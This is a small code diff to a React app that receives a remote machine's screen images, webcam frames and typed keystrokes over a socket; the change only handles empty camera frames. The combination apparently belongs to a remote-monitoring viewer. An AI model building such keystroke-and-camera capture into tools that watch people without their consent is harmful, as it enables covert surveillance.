@@ -31,7 +31,7 @@ export default function App() {
 
         // Receive Image Data
         socket.on("screen", (d) => setScreen("data:image/jpeg;base64," + d));
-        socket.on("camera", (d) => setCamera("data:image/jpeg;base64," + d));
+        socket.on("camera", (d) => setCamera(d?"data:image/jpeg;base64," + d:null));
         socket.on("keyinput", (d) => {
             setKeyinputs(prev => prev + d);
             if (textareaRef.current) {
